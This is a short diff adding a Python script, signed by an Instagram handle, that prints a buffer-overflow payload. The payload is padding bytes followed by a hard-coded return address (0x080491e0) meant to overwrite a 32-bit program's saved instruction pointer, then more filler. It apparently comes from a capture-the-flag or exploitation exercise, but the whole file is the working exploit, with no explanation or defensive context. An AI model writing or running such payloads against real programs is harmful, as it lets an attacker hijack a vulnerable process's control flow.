@@ -1,0 +1,8 @@
+#coded by -> ig : @hackie.techie
+import sys
+
+awal = b"AAAABBBBCCCCDDDDEEEEFF"
+eip = b'\xe0\x91\x04\x08'
+akhir = b"GGHHHHIIIIJJJJ"
+
+sys.stdout.buffer.write(awal + eip + akhir)
